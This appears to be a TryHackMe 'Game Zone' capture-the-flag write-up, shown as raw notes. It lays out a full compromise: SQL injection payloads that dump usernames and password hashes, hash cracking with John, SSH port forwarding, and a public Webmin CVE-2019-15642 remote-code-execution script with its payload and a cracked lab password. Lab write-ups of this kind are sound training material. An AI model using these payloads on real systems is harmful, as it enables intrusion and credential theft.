@@ -1,0 +1,298 @@
+RECON
+
+root@kali:~/tryhackme/gamezone# nmap -sC -sV -Pn 10.10.203.161
+Starting Nmap 7.70 ( https://nmap.org ) at 2020-10-24 10:47 EDT
+Nmap scan report for 10.10.203.161
+Host is up (0.016s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 61:ea:89:f1:d4:a7:dc:a5:50:f7:6d:89:c3:af:0b:03 (RSA)
+|   256 b3:7d:72:46:1e:d3:41:b6:6a:91:15:16:c9:4a:a5:fa (ECDSA)
+|_  256 53:67:09:dc:ff:fb:3a:3e:fb:fe:cf:d8:6d:41:27:ab (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Game Zone
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+ENUM
+SQL Injection in Portal
+Input in username
+' or 1=1 -- -
+
+
+http://10.10.203.161/portal.php
+
+TEST NUMBER OF COLUMNS
+POST /portal.php HTTP/1.1
+Host: 10.10.203.161
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.10.203.161/portal.php
+Cookie: PHPSESSID=foknftj2790uokqqpd4am3gq40
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 27
+
+searchitem=' ORDER BY 4-- -
+
+SQL ERROR MESSAGE
+Unknown column '4' in 'order clause'
+
+TEST FOR COLUMN POSITIONS
+POST /portal.php HTTP/1.1
+Host: 10.10.203.161
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.10.203.161/portal.php
+Cookie: PHPSESSID=foknftj2790uokqqpd4am3gq40
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 35
+
+searchitem=' UNION SELECT 1,2,3-- -
+
+CONFIRM INJECTION COLUMN 2
+POST /portal.php HTTP/1.1
+Host: 10.10.203.161
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.10.203.161/portal.php
+Cookie: PHPSESSID=foknftj2790uokqqpd4am3gq40
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 43
+
+searchitem=' UNION SELECT 1,"exploit",3-- -
+
+GET USER FROM UNION INJECTION
+POST /portal.php HTTP/1.1
+Host: 10.10.203.161
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.10.203.161/portal.php
+Cookie: PHPSESSID=foknftj2790uokqqpd4am3gq40
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 40
+
+searchitem=' UNION SELECT 1,user(),3-- -
+
+Title
+root@localhost
+
+TEST FOR DATABASE TYPE -- MYSQL
+POST /portal.php HTTP/1.1
+Host: 10.10.203.161
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.10.203.161/portal.php
+Cookie: PHPSESSID=foknftj2790uokqqpd4am3gq40
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 101
+
+searchitem=' UNION SELECT 1,(select group_concat(SCHEMA_NAME) from INFORMATION_SCHEMA.SCHEMATA),3-- -
+
+Title
+information_schema, db, mysql, performance_schema, sys
+
+DISCOVER DB TABLE NAMES
+POST /portal.php HTTP/1.1
+Host: 10.10.232.174
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.10.232.174/portal.php
+Cookie: PHPSESSID=9mdj2s4g004umd3thacsakifu3
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 127
+
+searchitem=' UNION SELECT 1,(select group_concat(COLUMN_NAME) from INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'users'),3-- -
+
+Title
+username, pwd, USER, CURRENT_CONNECTIONS, TOTAL_CONNECTIONS
+
+QUERY USER TABLE
+POST /portal.php HTTP/1.1
+Host: 10.10.232.174
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.10.232.174/portal.php
+Cookie: PHPSESSID=9mdj2s4g004umd3thacsakifu3
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 65
+
+searchitem=' UNION SELECT 1,(select username from db.users),3-- -
+
+Title
+agent47
+
+GET AGENT47 PASSWORD
+POST /portal.php HTTP/1.1
+Host: 10.10.232.174
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.10.232.174/portal.php
+Cookie: PHPSESSID=9mdj2s4g004umd3thacsakifu3
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 60
+
+searchitem=' UNION SELECT 1,(select pwd from db.users),3-- -
+
+Title
+ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14
+
+CRACK THE PASSWORD WITH JOHN
+~/src/john/run$ ./john /home/soladach/gameroom.txt --wordlist=/home/soladach/rockyou.txt --format=Raw-SHA256
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-SHA256 [SHA256 256/256 AVX2 8x])
+Warning: poor OpenMP scalability for this hash type, consider --fork=8
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+########    (?)
+1g 0:00:00:00 DONE (2020-10-24 19:05) 2.702g/s 8147Kp/s 8147Kc/s 8147KC/s vimivera..tyler912
+Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
+Session completed. 
+
+SSH INTO GAMEROOM
+root@kali:~/tryhackme# ssh agent47@10.10.232.174
+The authenticity of host '10.10.232.174 (10.10.232.174)' can't be established.
+ECDSA key fingerprint is SHA256:mpNHvzp9GPoOcwmWV/TMXiGwcqLIsVXDp5DvW26MFi8.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '10.10.232.174' (ECDSA) to the list of known hosts.
+agent47@10.10.232.174's password: 
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+109 packages can be updated.
+68 updates are security updates.
+
+
+Last login: Fri Aug 16 17:52:04 2019 from 192.168.1.147
+agent47@gamezone:~$ cat /home/agent47/user.txt 
+####################################
+
+CHECK LISTENING PORTS
+agent47@gamezone:~$ ss -tulpn
+Netid  State      Recv-Q Send-Q  Local Address:Port                 Peer Address:Port              
+udp    UNCONN     0      0                   *:68                              *:*                  
+udp    UNCONN     0      0                   *:10000                           *:*                  
+tcp    LISTEN     0      80          127.0.0.1:3306                            *:*                  
+tcp    LISTEN     0      128                 *:10000                           *:*                  
+tcp    LISTEN     0      128                 *:22                              *:*                  
+tcp    LISTEN     0      128                :::80                             :::*                  
+tcp    LISTEN     0      128                :::22                             :::* 
+
+EXPOSE LOCAL WEBMIN PORT VIA SSH FORWARDING
+root@kali:~/tryhackme/gamezone# ssh -L 10000:localhost:10000 agent47@10.10.127.208
+agent47@10.10.127.208's password: 
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+109 packages can be updated.
+68 updates are security updates.
+
+
+Last login: Sat Oct 24 20:29:34 2020 from 10.11.10.169
+
+GET SERVER VERSION WITH BURPSUITE
+http://localhost:10000/session_login.cgi
+
+REQUEST
+POST /session_login.cgi HTTP/1.1
+Host: localhost:10000
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost:10000/session_login.cgi
+Cookie: testing=1
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 30
+
+RESPONSE
+HTTP/1.0 200 Document follows
+Date: Sun, 25 Oct 2020 01:46:35 GMT
+Server: MiniServ/1.580
+Connection: close
+Set-Cookie: testing=1; path=/
+pragma: no-cache
+Expires: Thu, 1 Jan 1970 00:00:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Cache-Control: post-check=0, pre-check=0
+Content-type: text/html; Charset=iso-8859-1
+
+page=%2F&user=admin&pass=admin
+
+LOGIN TO WEBMIN WITH AGENT47 CREDENTIALS
+
+SEARCH FOR RCE ON  GITHUB FOR WEBMIN
+https://github.com/jas502n/CVE-2019-15642/blob/master/CVE-2019-15642.py
+
+root@kali:~/tryhackme/gamezone# python miniserv.py http://localhost:10000 "cat /root/root.txt"
+
+   _______      ________    ___   ___  __  ___        __ _____   __ _  _ ___  
+  / ____\ \    / /  ____|  |__ \ / _ \/_ |/ _ \      /_ | ____| / /| || |__ \ 
+ | |     \ \  / /| |__ ______ ) | | | || | (_) |______| | |__  / /_| || |_ ) |
+ | |      \ \/ / |  __|______/ /| | | || |\__, |______| |___ \| '_ \__   _/ / 
+ | |____   \  /  | |____    / /_| |_| || |  / /       | |___) | (_) | | |/ /_ 
+  \_____|   \/   |______|  |____|\___/ |_| /_/        |_|____/ \___/  |_|____|
+                                                                              
+                           python by jas502n 
+                        Webmin RCE (Need Authorization)
+   usage: python CVE-2019-15642.py https://xxx.xxx.xxx:10000 "cat /etc/passwd"                                                
+
+Please Input Webmin Username: agent47
+Please Input Webmin Password: videogamer124
+
+>>>Authorization: Basic YWdlbnQ0Nzp2aWRlb2dhbWVyMTI0
+
+payload= OBJECT CGI;print "Content-Type: Test\n\n";$cmd=`cat /root/root.txt`;print "$cmd";
+
+Vuln_Url= http://localhost:10000/rpc.cgi
+
+>>>Execute Response: 
+#############################
+
+
+
